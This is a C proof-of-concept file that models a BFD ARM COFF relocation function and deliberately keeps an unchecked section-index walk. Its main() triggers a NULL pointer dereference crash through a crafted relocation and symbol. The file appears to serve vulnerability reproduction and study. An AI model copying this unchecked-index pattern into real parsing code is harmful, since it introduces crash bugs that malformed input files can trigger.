#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* Force the vulnerable code path to be compiled. */
#define COFF_WITH_PE 1
#define ARM_WINCE 1

/* Minimal type/modeling of BFD internals used by the vulnerable function. */
typedef unsigned long long bfd_vma;

typedef struct asection asection;
typedef struct bfd bfd;

struct asection {
    asection *next;
    asection *output_section;
    bfd *owner;
    bfd_vma vma;
};

struct bfd {
    asection *sections;
    void *tdata; /* for pe_data() macro, not actually used at runtime in this PoC */
};

typedef struct reloc_howto_type {
    int dummy;
} reloc_howto_type;

struct internal_reloc {
    unsigned int r_type;
};

struct internal_syment {
    int n_scnum; /* section number */
};

/* Stub of coff_link_hash_entry with only the fields referenced in the snippet. */
struct coff_link_hash_entry {
    int type;
    struct {
        struct {
            struct {
                asection *section;
            } def;
        } u;
    } root;
};

/* Values used by the vulnerable code path. */
enum { bfd_link_hash_defined = 1, bfd_link_hash_defweak = 2 };

enum {
    ARM_RVA32 = 0,
    ARM_SECREL = 1,
    NUM_RELOCS = 8
};

/* Provide the howto table referenced by the function. */
static reloc_howto_type aoutarm_std_reloc_howto[NUM_RELOCS];

/* Minimal PE tdata to satisfy the compile-time reference in the ARM_RVA32 case. */
struct pe_opt_hdr_stub { bfd_vma ImageBase; };
struct pe_tdata_stub { struct pe_opt_hdr_stub pe_opthdr; };
#define pe_data(abfd) ((struct pe_tdata_stub *) ((abfd) ? (abfd)->tdata : NULL))

/* Vulnerable function modeled after bfd/coff-arm.c:coff_arm_rtype_to_howto. */
static reloc_howto_type *
coff_arm_rtype_to_howto(bfd *abfd,
                        asection *sec,
                        struct internal_reloc *rel,
                        struct coff_link_hash_entry *h,
                        struct internal_syment *sym,
                        bfd_vma *addendp)
{
    reloc_howto_type *howto;

    if (rel->r_type >= NUM_RELOCS)
        return NULL;

    howto = aoutarm_std_reloc_howto + rel->r_type;

    /* Not taken in this PoC, but must compile. */
    if (rel->r_type == ARM_RVA32)
        *addendp -= pe_data(sec->output_section->owner)->pe_opthdr.ImageBase;

#if defined COFF_WITH_PE && defined ARM_WINCE
    if (rel->r_type == ARM_SECREL)
    {
        bfd_vma osect_vma;

        if (h && (h->type == bfd_link_hash_defined || h->type == bfd_link_hash_defweak))
            osect_vma = h->root.u.def.section->output_section->vma;
        else
        {
            int i;
            /* Vulnerable walk: no bounds checking on sym->n_scnum. */
            for (sec = abfd->sections, i = 1; i < sym->n_scnum; i++)
                sec = sec->next;
            /* sec can be NULL here if sym->n_scnum exceeds the actual section count. */
            osect_vma = sec->output_section->vma; /* NULL deref here */
        }

        *addendp -= osect_vma;
    }
#endif

    return howto;
}

int main(void)
{
    /* Build a BFD with a single section in its list. */
    bfd *ab = (bfd *)calloc(1, sizeof(*ab));
    asection *s0 = (asection *)calloc(1, sizeof(*s0));
    if (!ab || !s0) {
        perror("calloc");
        return 1;
    }

    /* Initialize the single section; its next is NULL. */
    s0->next = NULL;
    s0->output_section = s0;  /* self for non-relocated sections */
    s0->owner = ab;
    s0->vma = 0x1000;

    ab->sections = s0;
    ab->tdata = NULL; /* not used by this PoC */

    /* Craft a relocation of type ARM_SECREL to hit the vulnerable path. */
    struct internal_reloc rel = { 0 };
    rel.r_type = ARM_SECREL;

    /* sym->n_scnum set to 2 while only 1 section exists causes sec to become NULL
       after the loop without dereferencing NULL inside the loop. */
    struct internal_syment sym = { 0 };
    sym.n_scnum = 2; /* exceeds the number of sections (which is 1) */

    bfd_vma addend = 0x2000;

    /* h == NULL ensures we take the else-branch that walks the section list. */

    /* This call should trigger a NULL pointer dereference at sec->output_section->vma. */
    (void)coff_arm_rtype_to_howto(ab, s0, &rel, NULL, &sym, &addend);

    /* Should not reach here. */
    puts("Unexpectedly survived the NULL dereference");

    return 0;
}
